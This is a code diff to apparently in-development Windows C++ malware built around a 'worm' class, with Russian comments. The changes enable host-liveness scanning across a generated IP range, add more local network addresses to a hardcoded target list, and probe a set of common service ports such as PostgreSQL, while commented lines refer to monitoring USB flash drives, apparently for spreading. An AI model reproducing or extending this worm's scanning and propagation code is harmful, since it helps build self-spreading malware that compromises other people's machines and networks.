@@ -18,8 +18,8 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	std::wcerr.imbue(loc);
 
 	setlocale(LC_ALL, ".UTF8");
-	
-	
+
+
 	worm worm1;
 	worm::instance = &worm1;
 
@@ -36,7 +36,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 		auto range = generate_ip_range(ip, mask); // теперь правильно
 		for (const auto& ip_ws : range) {
-			bool host_bool = 0; // = is_host_alive(ip_ws); // поменять (раскомментировать)
+			bool host_bool = is_host_alive(ip_ws); // = is_host_alive(ip_ws); // поменять (раскомментировать)
 			std::wcout << ip_ws << L" " << host_bool << std::endl;
 			if (host_bool) {
 				alive_ip.push_back(ip_ws);
@@ -71,10 +71,10 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 	5432   // PostgreSQL
 	};
 
-	vector<wstring> ip_vector = {L"192.168.0.147", L"192.168.0.1"}; // удалить
-	
+	vector<wstring> ip_vector = { L"192.168.0.147", L"192.168.0.1", L"192.168.0.184", L"192.168.0.187"}; // удалить
 
-	for (wstring &ip : ip_vector) { // alive_ip -> ip_vector // поменять
+
+	for (wstring& ip : ip_vector) { // alive_ip -> ip_vector // поменять
 		for (int port : critical_and_popular_ports) {
 			bool test_port = is_port_open(ip, port);
 			if (test_port) {
@@ -86,7 +86,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 
 
-	
+
 
 	worm1.worm_was_end();
 	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
@@ -111,7 +111,7 @@ int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR lpCmdLin
 
 	//worm1.worm_was_end();
 	//return worm1.run_device_monitor(hInstance); // запуск мониторинга флешек
-	
-	
+
+
 	//wcout<<get_own_path();
 }
